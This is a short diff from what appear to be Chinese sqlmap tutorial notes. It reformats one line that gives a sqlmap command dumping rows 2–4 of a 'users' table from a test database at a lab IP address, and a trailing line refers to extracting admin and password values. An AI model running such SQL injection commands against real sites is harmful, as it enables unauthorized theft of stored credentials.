@@ -26,8 +26,7 @@
 		
 	Note:
         
-           1) 指定列的范围从2－4 : 
-           python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --dump -T users -D test --start 2 --stop 4 -v 0
+           1) 指定列的范围从2－4 : python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --dump -T users -D test --start 2 --stop 4 -v 0
 			
 5. 得到列名有admin，password，需要值：
 
